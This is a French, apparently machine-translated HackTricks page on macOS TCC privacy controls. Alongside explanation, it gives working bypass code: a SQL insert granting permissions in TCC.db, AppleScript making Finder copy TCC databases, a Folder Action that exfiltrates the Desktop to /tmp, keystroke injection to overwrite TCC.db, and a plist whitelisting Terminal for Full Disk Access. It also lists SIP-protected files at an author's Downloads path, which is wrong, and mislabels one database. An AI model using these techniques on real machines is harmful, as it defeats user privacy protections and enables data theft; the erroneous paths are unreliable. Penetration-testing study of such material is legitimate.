# macOS TCC

<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en équipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres façons de soutenir HackTricks:

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts GitHub.

</details>

## **Informations de base**

**TCC (Transparency, Consent, and Control)** est un protocole de sécurité axé sur la régulation des autorisations d'application. Son rôle principal est de protéger des fonctionnalités sensibles telles que **les services de localisation, les contacts, les photos, le microphone, la caméra, l'accessibilité et l'accès complet au disque**. En exigeant le consentement explicite de l'utilisateur avant d'accorder à une application l'accès à ces éléments, le TCC renforce la confidentialité et le contrôle de l'utilisateur sur leurs données.

Les utilisateurs rencontrent le TCC lorsque les applications demandent l'accès à des fonctionnalités protégées. Cela se manifeste par une invite qui permet aux utilisateurs d'**approuver ou de refuser l'accès**. De plus, le TCC prend en charge des actions directes de l'utilisateur, telles que **le glisser-déposer de fichiers dans une application**, pour accorder l'accès à des fichiers spécifiques, garantissant que les applications n'ont accès qu'à ce qui est explicitement autorisé.

![Un exemple d'une invite TCC](https://rainforest.engineering/images/posts/macos-tcc/tcc-prompt.png?1620047855)

**TCC** est géré par le **démon** situé dans `/System/Library/PrivateFrameworks/TCC.framework/Support/tccd` et configuré dans `/System/Library/LaunchDaemons/com.apple.tccd.system.plist` (enregistrant le service mach `com.apple.tccd.system`).

Il y a un **tccd en mode utilisateur** s'exécutant par utilisateur connecté défini dans `/System/Library/LaunchAgents/com.apple.tccd.plist` enregistrant les services mach `com.apple.tccd` et `com.apple.usernotifications.delegate.com.apple.tccd`.

Ici, vous pouvez voir le tccd s'exécutant en tant que système et en tant qu'utilisateur:
```bash
ps -ef | grep tcc
0   374     1   0 Thu07PM ??         2:01.66 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd system
501 63079     1   0  6:59PM ??         0:01.95 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
```
Les autorisations sont **héritées de l'application parente** et les **autorisations** sont **suivies** en fonction de l'**ID de Bundle** et de l'**ID du développeur**.

### Bases de données TCC

Les autorisations/refus sont ensuite stockés dans certaines bases de données TCC :

- La base de données système dans **`/Library/Application Support/com.apple.TCC/TCC.db`**.
- Cette base de données est **protégée par SIP**, donc seul un contournement de SIP peut écrire dedans.
- La base de données utilisateur TCC **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`** pour les préférences par utilisateur.
- Cette base de données est protégée, donc seuls les processus avec des privilèges TCC élevés comme l'Accès complet au disque peuvent écrire dedans (mais elle n'est pas protégée par SIP).

{% hint style="warning" %}
Les bases de données précédentes sont également **protégées par TCC pour l'accès en lecture**. Vous ne pourrez donc pas lire votre base de données TCC utilisateur régulière à moins que ce ne soit à partir d'un processus avec des privilèges TCC.

Cependant, rappelez-vous qu'un processus avec ces privilèges élevés (comme **FDA** ou **`kTCCServiceEndpointSecurityClient`**) pourra écrire dans la base de données TCC utilisateur.
{% endhint %}

- Il existe une **troisième** base de données TCC dans **`/var/db/locationd/clients.plist`** pour indiquer les clients autorisés à **accéder aux services de localisation**.
- Le fichier protégé par SIP **`/Users/carlospolop/Downloads/REG.db`** (également protégé contre l'accès en lecture avec TCC), contient l'emplacement de toutes les bases de données TCC valides.
- Le fichier protégé par SIP **`/Users/carlospolop/Downloads/MDMOverrides.plist`** (également protégé contre l'accès en lecture avec TCC), contient plus d'autorisations accordées par TCC.
- Le fichier protégé par SIP **`/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist`** (mais lisible par n'importe qui) est une liste d'applications autorisées nécessitant une exception TCC.

{% hint style="success" %}
La base de données TCC dans **iOS** se trouve dans **`/private/var/mobile/Library/TCC/TCC.db`**
{% endhint %}

{% hint style="info" %}
L'**interface utilisateur du centre de notifications** peut apporter des **changements dans la base de données TCC système** :

{% code overflow="wrap" %}
```bash
codesign -dv --entitlements :- /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
[..]
com.apple.private.tcc.manager
com.apple.rootless.storage.TCC
```
{% endcode %}

Cependant, les utilisateurs peuvent **supprimer ou interroger des règles** avec l'utilitaire en ligne de commande **`tccutil`**.
{% endhint %}

#### Interroger les bases de données

{% tabs %}
{% tab title="base de données utilisateur" %}
{% code overflow="wrap" %}
```bash
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{% endcode %}
{% endtab %}

{% tab title="base de données système" %}
{% code overflow="wrap" %}
```bash
sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Get all FDA
sqlite> select service, client, auth_value, auth_reason from access where service = "kTCCServiceSystemPolicyAllFiles" and auth_value=2;

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{% endcode %}
{% endtab %}
{% endtabs %}

{% hint style="success" %}
En vérifiant les deux bases de données, vous pouvez vérifier les autorisations qu'une application a autorisées, interdites ou n'a pas (elle les demandera).
{% endhint %}

* Le **`service`** est la représentation en chaîne de **permission** TCC
* Le **`client`** est l'**ID de bundle** ou le **chemin binaire** avec les autorisations
* Le **`client_type`** indique s'il s'agit d'un identifiant de bundle(0) ou d'un chemin absolu(1)

<details>

<summary>Comment exécuter s'il s'agit d'un chemin absolu</summary>

Il suffit de faire **`launctl load you_bin.plist`**, avec un plist comme suit:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<!-- Label for the job -->
<key>Label</key>
<string>com.example.yourbinary</string>

<!-- The path to the executable -->
<key>Program</key>
<string>/path/to/binary</string>

<!-- Arguments to pass to the executable (if any) -->
<key>ProgramArguments</key>
<array>
<string>arg1</string>
<string>arg2</string>
</array>

<!-- Run at load -->
<key>RunAtLoad</key>
<true/>

<!-- Keep the job alive, restart if necessary -->
<key>KeepAlive</key>
<true/>

<!-- Standard output and error paths (optional) -->
<key>StandardOutPath</key>
<string>/tmp/YourBinary.stdout</string>
<key>StandardErrorPath</key>
<string>/tmp/YourBinary.stderr</string>
</dict>
</plist>
```
</details>

* La valeur **`auth_value`** peut avoir différentes valeurs : denied(0), unknown(1), allowed(2), ou limited(3).
* La raison **`auth_reason`** peut prendre les valeurs suivantes : Error(1), User Consent(2), User Set(3), System Set(4), Service Policy(5), MDM Policy(6), Override Policy(7), Missing usage string(8), Prompt Timeout(9), Preflight Unknown(10), Entitled(11), App Type Policy(12)
* Le champ **csreq** est là pour indiquer comment vérifier le binaire à exécuter et accorder les permissions TCC :
```bash
# Query to get cserq in printable hex
select service, client, hex(csreq) from access where auth_value=2;

# To decode it (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
BLOB="FADE0C000000003000000001000000060000000200000012636F6D2E6170706C652E5465726D696E616C000000000003"
echo "$BLOB" | xxd -r -p > terminal-csreq.bin
csreq -r- -t < terminal-csreq.bin

# To create a new one (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
REQ_STR=$(codesign -d -r- /Applications/Utilities/Terminal.app/ 2>&1 | awk -F ' => ' '/designated/{print $2}')
echo "$REQ_STR" | csreq -r- -b /tmp/csreq.bin
REQ_HEX=$(xxd -p /tmp/csreq.bin  | tr -d '\n')
echo "X'$REQ_HEX'"
```
* Pour plus d'informations sur les **autres champs** du tableau, [consultez cet article de blog](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive).

Vous pouvez également vérifier les **autorisations déjà accordées** aux applications dans `Préférences Système --> Sécurité et confidentialité --> Confidentialité --> Fichiers et Dossiers`.

{% hint style="success" %}
Les utilisateurs _peuvent_ **supprimer ou interroger des règles** en utilisant **`tccutil`**.
{% endhint %}

#### Réinitialiser les autorisations TCC
```bash
# You can reset all the permissions given to an application with
tccutil reset All app.some.id

# Reset the permissions granted to all apps
tccutil reset All
```
### Vérifications de signature TCC

La base de données TCC stocke l'**ID de Bundle** de l'application, mais elle stocke également des **informations** sur la **signature** pour **s'assurer** que l'application demandant l'autorisation est la bonne.

{% code overflow="wrap" %}
```bash
# From sqlite
sqlite> select service, client, hex(csreq) from access where auth_value=2;
#Get csreq

# From bash
echo FADE0C00000000CC000000010000000600000007000000060000000F0000000E000000000000000A2A864886F763640601090000000000000000000600000006000000060000000F0000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A364E33385657533542580000000000020000001572752E6B656570636F6465722E54656C656772616D000000 | xxd -r -p - > /tmp/telegram_csreq.bin
## Get signature checks
csreq -t -r /tmp/telegram_csreq.bin
(anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] /* exists */ or anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */ and certificate leaf[subject.OU] = "6N38VWS5BX") and identifier "ru.keepcoder.Telegram"
```
{% endcode %}

{% hint style="warning" %}
Par conséquent, d'autres applications utilisant le même nom et l'ID de bundle ne pourront pas accéder aux autorisations accordées à d'autres applications.
{% endhint %}

### Autorisations et permissions TCC

Les applications **doivent non seulement** demander et se voir **accorder l'accès** à certaines ressources, mais elles doivent également **avoir les autorisations pertinentes**.\
Par exemple, **Telegram** a l'autorisation `com.apple.security.device.camera` pour demander **l'accès à la caméra**. Une **application** qui n'a pas cette **autorisation ne pourra pas** accéder à la caméra (et l'utilisateur ne sera même pas invité à donner les autorisations).

Cependant, pour que les applications puissent **accéder** à **certains dossiers utilisateur**, tels que `~/Desktop`, `~/Downloads` et `~/Documents`, elles **n'ont pas besoin** d'avoir des **autorisations spécifiques.** Le système gérera l'accès de manière transparente et **demandera à l'utilisateur** si nécessaire.

Les applications d'Apple **ne généreront pas de fenêtres contextuelles**. Elles contiennent des **droits préalablement accordés** dans leur **liste d'autorisations**, ce qui signifie qu'elles ne **généreront jamais de fenêtre contextuelle**, **ni** n'apparaîtront dans l'un des **bases de données TCC.** Par exemple:
```bash
codesign -dv --entitlements :- /System/Applications/Calendar.app
[...]
<key>com.apple.private.tcc.allow</key>
<array>
<string>kTCCServiceReminders</string>
<string>kTCCServiceCalendar</string>
<string>kTCCServiceAddressBook</string>
</array>
```
Cela évitera à Calendar de demander à l'utilisateur d'accéder aux rappels, au calendrier et au carnet d'adresses.

{% hint style="success" %}
Outre quelques documentations officielles sur les autorisations, il est également possible de trouver des **informations intéressantes non officielles sur les autorisations** dans [**https://newosxbook.com/ent.jl**](https://newosxbook.com/ent.jl)
{% endhint %}

Certaines autorisations TCC sont : kTCCServiceAppleEvents, kTCCServiceCalendar, kTCCServicePhotos... Il n'existe pas de liste publique définissant toutes ces autorisations, mais vous pouvez consulter cette [**liste de celles connues**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive#service).

### Endroits sensibles non protégés

* $HOME (lui-même)
* $HOME/.ssh, $HOME/.aws, etc
* /tmp

### Intention de l'utilisateur / com.apple.macl

Comme mentionné précédemment, il est possible d'**accorder l'accès à une application à un fichier en le faisant glisser-déposer dessus**. Cet accès ne sera pas spécifié dans une base de données TCC mais en tant qu'**attribut étendu du fichier**. Cet attribut **stockera l'UUID** de l'application autorisée :
```bash
xattr Desktop/private.txt
com.apple.macl

# Check extra access to the file
## Script from https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command
macl_read Desktop/private.txt
Filename,Header,App UUID
"Desktop/private.txt",0300,769FD8F1-90E0-3206-808C-A8947BEBD6C3

# Get the UUID of the app
otool -l /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal| grep uuid
uuid 769FD8F1-90E0-3206-808C-A8947BEBD6C3
```
{% hint style="info" %}
Il est curieux que l'attribut **`com.apple.macl`** soit géré par le **Sandbox**, et non par tccd.

Notez également que si vous déplacez un fichier qui autorise l'UUID d'une application sur votre ordinateur vers un autre ordinateur, car la même application aura des UID différents, cela ne donnera pas accès à cette application.
{% endhint %}

L'attribut étendu `com.apple.macl` **ne peut pas être effacé** comme les autres attributs étendus car il est **protégé par SIP**. Cependant, comme [**expliqué dans cet article**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/), il est possible de le désactiver en **compressant** le fichier, en le **supprimant** et en le **décompressant**.

## Privilèges et contournements de TCC

### Insérer dans TCC

Si à un moment donné vous parvenez à obtenir un accès en écriture sur une base de données TCC, vous pouvez utiliser quelque chose comme ce qui suit pour ajouter une entrée (supprimez les commentaires):

<details>

<summary>Exemple d'insertion dans TCC</summary>
```sql
INSERT INTO access (
service,
client,
client_type,
auth_value,
auth_reason,
auth_version,
csreq,
policy_id,
indirect_object_identifier_type,
indirect_object_identifier,
indirect_object_code_identity,
flags,
last_modified,
pid,
pid_version,
boot_uuid,
last_reminded
) VALUES (
'kTCCServiceSystemPolicyDesktopFolder', -- service
'com.googlecode.iterm2', -- client
0, -- client_type (0 - bundle id)
2, -- auth_value  (2 - allowed)
3, -- auth_reason (3 - "User Set")
1, -- auth_version (always 1)
X'FADE0C00000000C40000000100000006000000060000000F0000000200000015636F6D2E676F6F676C65636F64652E697465726D32000000000000070000000E000000000000000A2A864886F7636406010900000000000000000006000000060000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A483756375859565137440000', -- csreq is a BLOB, set to NULL for now
NULL, -- policy_id
NULL, -- indirect_object_identifier_type
'UNUSED', -- indirect_object_identifier - default value
NULL, -- indirect_object_code_identity
0, -- flags
strftime('%s', 'now'), -- last_modified with default current timestamp
NULL, -- assuming pid is an integer and optional
NULL, -- assuming pid_version is an integer and optional
'UNUSED', -- default value for boot_uuid
strftime('%s', 'now') -- last_reminded with default current timestamp
);
```
</details>

### Charges TCC

Si vous avez réussi à pénétrer dans une application avec certaines autorisations TCC, consultez la page suivante avec des charges TCC pour les abuser :

{% content-ref url="macos-tcc-payloads.md" %}
[macos-tcc-payloads.md](macos-tcc-payloads.md)
{% endcontent-ref %}

### Automatisation (Finder) vers FDA\*

Le nom TCC de l'autorisation d'automatisation est : **`kTCCServiceAppleEvents`**\
Cette autorisation TCC spécifique indique également l'**application qui peut être gérée** dans la base de données TCC (donc les autorisations ne permettent pas de tout gérer).

**Finder** est une application qui **a toujours FDA** (même si elle n'apparaît pas dans l'interface utilisateur), donc si vous avez des privilèges d'**automatisation** dessus, vous pouvez abuser de ses privilèges pour **lui faire effectuer certaines actions**.\
Dans ce cas, votre application aurait besoin de l'autorisation **`kTCCServiceAppleEvents`** sur **`com.apple.Finder`**.

{% tabs %}
{% tab title="Voler la base de données TCC des utilisateurs" %}
```applescript
# This AppleScript will copy the system TCC database into /tmp
osascript<<EOD
tell application "Finder"
set homeFolder to path to home folder as string
set sourceFile to (homeFolder & "Library:Application Support:com.apple.TCC:TCC.db") as alias
set targetFolder to POSIX file "/tmp" as alias
duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```
{% endtab %}

{% tab title="Voler TCC.db des systèmes" %}
```applescript
osascript<<EOD
tell application "Finder"
set sourceFile to POSIX file "/Library/Application Support/com.apple.TCC/TCC.db" as alias
set targetFolder to POSIX file "/tmp" as alias
duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```
{% endtab %}
{% endtabs %}

Vous pourriez abuser de cela pour **écrire votre propre base de données utilisateur TCC**.

{% hint style="warning" %}
Avec cette autorisation, vous pourrez **demander au Finder d'accéder aux dossiers restreints par TCC** et vous donner les fichiers, mais à ma connaissance, vous **ne pourrez pas faire exécuter un code arbitraire par Finder** pour abuser pleinement de son accès FDA.

Par conséquent, vous ne pourrez pas abuser des capacités complètes de la FDA.
{% endhint %}

Voici la fenêtre contextuelle TCC pour obtenir des privilèges d'automatisation sur Finder :

<figure><img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" width="244"><figcaption></figcaption></figure>

{% hint style="danger" %}
Notez que parce que l'application **Automator** a l'autorisation TCC **`kTCCServiceAppleEvents`**, elle peut **contrôler n'importe quelle application**, comme Finder. Ainsi, en ayant l'autorisation de contrôler Automator, vous pourriez également contrôler le **Finder** avec un code comme celui ci-dessous :
{% endhint %}

<details>

<summary>Obtenir un shell à l'intérieur d'Automator</summary>
```applescript
osascript<<EOD
set theScript to "touch /tmp/something"

tell application "Automator"
set actionID to Automator action id "com.apple.RunShellScript"
tell (make new workflow)
add actionID to it
tell last Automator action
set value of setting "inputMethod" to 1
set value of setting "COMMAND_STRING" to theScript
end tell
execute it
end tell
activate
end tell
EOD
# Once inside the shell you can use the previous code to make Finder copy the TCC databases for example and not TCC prompt will appear
```
</details>

De même avec l'application **Script Editor,** elle peut contrôler Finder, mais en utilisant un AppleScript, vous ne pouvez pas le forcer à exécuter un script.

### Automatisation (SE) vers certains TCC

**System Events peut créer des actions de dossier, et les actions de dossier peuvent accéder à certains dossiers TCC** (Bureau, Documents et Téléchargements), donc un script comme celui-ci peut être utilisé pour abuser de ce comportement:
```bash
# Create script to execute with the action
cat > "/tmp/script.js" <<EOD
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("cp -r $HOME/Desktop /tmp/desktop");
EOD

osacompile -l JavaScript -o "$HOME/Library/Scripts/Folder Action Scripts/script.scpt" "/tmp/script.js"

# Create folder action with System Events in "$HOME/Desktop"
osascript <<EOD
tell application "System Events"
-- Ensure Folder Actions are enabled
set folder actions enabled to true

-- Define the path to the folder and the script
set homeFolder to path to home folder as text
set folderPath to homeFolder & "Desktop"
set scriptPath to homeFolder & "Library:Scripts:Folder Action Scripts:script.scpt"

-- Create or get the Folder Action for the Desktop
if not (exists folder action folderPath) then
make new folder action at end of folder actions with properties {name:folderPath, path:folderPath}
end if
set myFolderAction to folder action folderPath

-- Attach the script to the Folder Action
if not (exists script scriptPath of myFolderAction) then
make new script at end of scripts of myFolderAction with properties {name:scriptPath, path:scriptPath}
end if

-- Enable the Folder Action and the script
enable myFolderAction
end tell
EOD

# File operations in the folder should trigger the Folder Action
touch "$HOME/Desktop/file"
rm "$HOME/Desktop/file"
```
### Automatisation (SE) + Accessibilité (**`kTCCServicePostEvent`|**`kTCCServiceAccessibility`**)** vers FDA\*

L'automatisation sur **`System Events`** + l'accessibilité (**`kTCCServicePostEvent`**) permet d'envoyer des **frappes de touches aux processus**. De cette manière, vous pourriez abuser de Finder pour modifier la base de données TCC de l'utilisateur ou accorder l'accès FDA à une application arbitraire (bien qu'un mot de passe puisse être demandé pour cela).

Exemple de modification de la base de données TCC de l'utilisateur par Finder :
```applescript
-- store the TCC.db file to copy in /tmp
osascript <<EOF
tell application "System Events"
-- Open Finder
tell application "Finder" to activate

-- Open the /tmp directory
keystroke "g" using {command down, shift down}
delay 1
keystroke "/tmp"
delay 1
keystroke return
delay 1

-- Select and copy the file
keystroke "TCC.db"
delay 1
keystroke "c" using {command down}
delay 1

-- Resolve $HOME environment variable
set homePath to system attribute "HOME"

-- Navigate to the Desktop directory under $HOME
keystroke "g" using {command down, shift down}
delay 1
keystroke homePath & "/Library/Application Support/com.apple.TCC"
delay 1
keystroke return
delay 1

-- Check if the file exists in the destination and delete if it does (need to send keystorke code: https://macbiblioblog.blogspot.com/2014/12/key-codes-for-function-and-special-keys.html)
keystroke "TCC.db"
delay 1
keystroke return
delay 1
key code 51 using {command down}
delay 1

-- Paste the file
keystroke "v" using {command down}
end tell
EOF
```
### `kTCCServiceAccessibility` vers FDA\*

Consultez cette page pour quelques [**payloads pour abuser des autorisations d'accessibilité**](macos-tcc-payloads.md#accessibility) pour une élévation de privilèges vers FDA\* ou exécuter un enregistreur de frappe par exemple.

### **Client de sécurité de point de terminaison vers FDA**

Si vous avez **`kTCCServiceEndpointSecurityClient`**, vous avez FDA. Fin.

### Politique système SysAdmin de fichiers vers FDA

**`kTCCServiceSystemPolicySysAdminFiles`** permet de **modifier** l'attribut **`NFSHomeDirectory`** d'un utilisateur qui modifie son dossier personnel et permet donc de **contourner TCC**.

### Base de données TCC utilisateur vers FDA

En obtenant des **permissions d'écriture** sur la **base de données TCC** utilisateur, vous ne pouvez pas vous accorder vous-même les permissions **`FDA`**, seules celles qui se trouvent dans la base de données système peuvent le faire.

Mais vous pouvez vous accorder les **`droits d'automatisation sur Finder`**, et abuser de la technique précédente pour une élévation de privilèges vers FDA\*.

### **Permissions FDA vers TCC**

L'accès complet au disque est nommé TCC **`kTCCServiceSystemPolicyAllFiles`**

Je ne pense pas que ce soit une véritable élévation de privilèges, mais au cas où vous le trouveriez utile : Si vous contrôlez un programme avec FDA, vous pouvez **modifier la base de données TCC des utilisateurs et vous accorder n'importe quel accès**. Cela peut être utile en tant que technique de persistance au cas où vous pourriez perdre vos permissions FDA.

### **Contournement de SIP pour contourner TCC**

La base de données système TCC est protégée par **SIP**, c'est pourquoi seuls les processus avec les **autorisations indiquées pourront la modifier**. Par conséquent, si un attaquant trouve un **contournement de SIP** sur un **fichier** (pouvoir modifier un fichier restreint par SIP), il pourra :

* **Supprimer la protection** d'une base de données TCC et s'accorder toutes les permissions TCC. Il pourrait abuser de l'un de ces fichiers par exemple :
* La base de données système TCC
* REG.db
* MDMOverrides.plist

Cependant, il existe une autre option pour abuser de ce **contournement de SIP pour contourner TCC**, le fichier `/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist` est une liste blanche des applications nécessitant une exception TCC. Par conséquent, si un attaquant peut **supprimer la protection SIP** de ce fichier et ajouter sa **propre application**, l'application pourra contourner TCC.\
Par exemple pour ajouter Terminal :
```bash
# Get needed info
codesign -d -r- /System/Applications/Utilities/Terminal.app
```
AllowApplicationsList.plist:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Services</key>
<dict>
<key>SystemPolicyAllFiles</key>
<array>
<dict>
<key>CodeRequirement</key>
<string>identifier &quot;com.apple.Terminal&quot; and anchor apple</string>
<key>IdentifierType</key>
<string>bundleID</string>
<key>Identifier</key>
<string>com.apple.Terminal</string>
</dict>
</array>
</dict>
</dict>
</plist>
```
### Contournements de TCC

{% content-ref url="macos-tcc-bypasses/" %}
[macos-tcc-bypasses](macos-tcc-bypasses/)
{% endcontent-ref %}

## Références

* [**https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
* [**https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command**](https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command)
* [**https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)
* [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)

<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en équipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres façons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
